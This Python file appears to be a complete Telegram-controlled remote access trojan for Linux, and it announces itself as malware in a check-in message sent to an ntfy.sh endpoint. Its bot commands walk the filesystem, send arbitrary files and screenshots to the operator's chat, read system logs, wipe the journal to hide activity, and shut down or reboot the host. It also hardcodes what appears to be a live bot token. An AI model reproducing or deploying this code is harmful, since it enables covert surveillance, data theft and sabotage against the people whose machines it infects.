import os
import logging
import subprocess
import requests
from mss import mss
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Define your bot token from @BotFather
BOT_TOKEN = '6917166572:AAEcTKmLNtUqHUZQJ-Qj2xwdBlQxG-ZPU2k'
NTFY_URL = 'https://ntfy.sh/telegrambot'  # Replace with your ntfy.sh URL

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Notify server that the script is online
def notify_server():
    try:
        requests.post(NTFY_URL, data="your malware has been activated. happy hacking.")
        logger.info("Successfully notified server.")
    except Exception as e:
        logger.error(f"Failed to send notification: {e}")

# Command to list files with popular extensions
async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    exclude_dirs = ['/bin', '/boot', '/dev', '/etc', '/lib', '/lib64', '/proc', '/run', '/sbin', '/sys', '/usr', '/var']
    popular_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.py', '.js', '.html', '.css', '.cpp', '.c', '.java', '.rb', '.php', '.sql', '.sh', '.txt', '.md', '.doc', '.docx', '.xls', '.xlsx', '.pdf']
    file_paths = []

    for root, dirs, files in os.walk('/'):
        # Skip excluded directories
        dirs[:] = [d for d in dirs if os.path.join(root, d) not in exclude_dirs]
        for file in files:
            if any(file.endswith(ext) for ext in popular_extensions):
                file_paths.append(os.path.join(root, file))

    # Save the list of files to a text file
    with open('/tmp/list_files.txt', 'w') as f:
        for file_path in file_paths:
            f.write(f"{file_path}\n")

    # Send the text file
    try:
        await context.bot.send_document(chat_id=update.message.chat_id, document=open('/tmp/list_files.txt', 'rb'))
        logger.info("Successfully sent list of files.")
    except Exception as e:
        logger.error(f"Failed to send list of files: {e}")
    finally:
        os.remove('/tmp/list_files.txt')

# Command to send a file
async def send_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file_path = ' '.join(context.args)
    if os.path.isfile(file_path):
        try:
            await context.bot.send_document(chat_id=update.message.chat_id, document=open(file_path, 'rb'))
            logger.info(f"Successfully sent file: {file_path}")
        except Exception as e:
            logger.error(f"Failed to send file {file_path}: {e}")
    else:
        await update.message.reply_text(f"'{file_path}' is not a valid file")

# Command to take a screenshot
async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    screenshot_path = "/tmp/screenshot.png"
    try:
        with mss() as sct:
            sct.shot(output=screenshot_path)
        await context.bot.send_photo(chat_id=update.message.chat_id, photo=open(screenshot_path, 'rb'))
        logger.info("Successfully sent screenshot.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred while taking screenshot: {e}")
        logger.error(f"Failed to take screenshot: {e}")
    finally:
        os.remove(screenshot_path)

# Command to list recently opened files
async def list_recently_opened(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        result = subprocess.run(['find', '/', '-xdev', '-type', 'f', '-atime', '-7', '-print'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.stderr:
            await update.message.reply_text(f"Error: {result.stderr}")
        else:
            with open('/tmp/recently_opened.txt', 'w') as f:
                f.write(result.stdout)
            await context.bot.send_document(chat_id=update.message.chat_id, document=open('/tmp/recently_opened.txt', 'rb'))
            logger.info("Successfully sent list of recently opened files.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")
        logger.error(f"Failed to list recently opened files: {e}")
    finally:
        os.remove('/tmp/recently_opened.txt')

# Command to list recently modified files
async def list_recently_modified(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        result = subprocess.run(['find', '/', '-xdev', '-type', 'f', '-mtime', '-7', '-print'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.stderr:
            await update.message.reply_text(f"Error: {result.stderr}")
        else:
            with open('/tmp/recently_modified.txt', 'w') as f:
                f.write(result.stdout)
            await context.bot.send_document(chat_id=update.message.chat_id, document=open('/tmp/recently_modified.txt', 'rb'))
            logger.info("Successfully sent list of recently modified files.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")
        logger.error(f"Failed to list recently modified files: {e}")
    finally:
        os.remove('/tmp/recently_modified.txt')

# Command to search files
async def search_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = ' '.join(context.args)
    try:
        result = subprocess.run(['find', '/', '-xdev', '-type', 'f', '-iname', f'*{query}*'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.stderr:
            await update.message.reply_text(f"Error: {result.stderr}")
        else:
            with open('/tmp/search_files.txt', 'w') as f:
                f.write(result.stdout)
            await context.bot.send_document(chat_id=update.message.chat_id, document=open('/tmp/search_files.txt', 'rb'))
            logger.info(f"Successfully searched files with query: {query}")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")
        logger.error(f"Failed to search files with query {query}: {e}")
    finally:
        os.remove('/tmp/search_files.txt')

# Command to shutdown the system
async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run(['shutdown', 'now'], check=True)
        await update.message.reply_text("System is shutting down.")
        logger.info("System shutdown initiated.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")
        logger.error(f"Failed to shutdown system: {e}")

# Command to reboot the system
async def reboot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run(['reboot'], check=True)
        await update.message.reply_text("System is rebooting.")
        logger.info("System reboot initiated.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")
        logger.error(f"Failed to reboot system: {e}")

# Command to suspend the system
async def suspend(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run(['systemctl', 'suspend'], check=True)
        await update.message.reply_text("System is suspending.")
        logger.info("System suspension initiated.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")
        logger.error(f"Failed to suspend system: {e}")

# Command to clear logs
async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run(['journalctl', '--rotate'], check=True)
        subprocess.run(['journalctl', '--vacuum-time=1s'], check=True)
        await update.message.reply_text("Logs have been cleared.")
        logger.info("System logs cleared.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")
        logger.error(f"Failed to clear logs: {e}")

# Command to get logs
async def get_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        result = subprocess.run(['journalctl', '-n', '100'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.stderr:
            await update.message.reply_text(f"Error: {result.stderr}")
        else:
            with open('/tmp/get_logs.txt', 'w') as f:
                f.write(result.stdout)
            await context.bot.send_document(chat_id=update.message.chat_id, document=open('/tmp/get_logs.txt', 'rb'))
            logger.info("Successfully retrieved system logs.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {e}")
        logger.error(f"Failed to retrieve system logs: {e}")
    finally:
        os.remove('/tmp/get_logs.txt')

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot is active. Use /listfiles, /sendfile, /screenshot, /listrecentlyopened, /listrecentlymodified, /searchfiles, /shutdown, /reboot, /suspend, /clearlogs, /getlogs commands.")
    logger.info("Bot start command received.")

# Initialize the bot
app = ApplicationBuilder().token(BOT_TOKEN).build()

# Adding command handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("listfiles", list_files))
app.add_handler(CommandHandler("sendfile", send_file))
app.add_handler(CommandHandler("screenshot", screenshot))
app.add_handler(CommandHandler("listrecentlyopened", list_recently_opened))
app.add_handler(CommandHandler("listrecentlymodified", list_recently_modified))
app.add_handler(CommandHandler("searchfiles", search_files))
app.add_handler(CommandHandler("shutdown", shutdown))
app.add_handler(CommandHandler("reboot", reboot))
app.add_handler(CommandHandler("suspend", suspend))
app.add_handler(CommandHandler("clearlogs", clear_logs))
app.add_handler(CommandHandler("getlogs", get_logs))

# Notify server that the script is online
notify_server()

# Start polling
if __name__ == '__main__':
    app.run_polling()

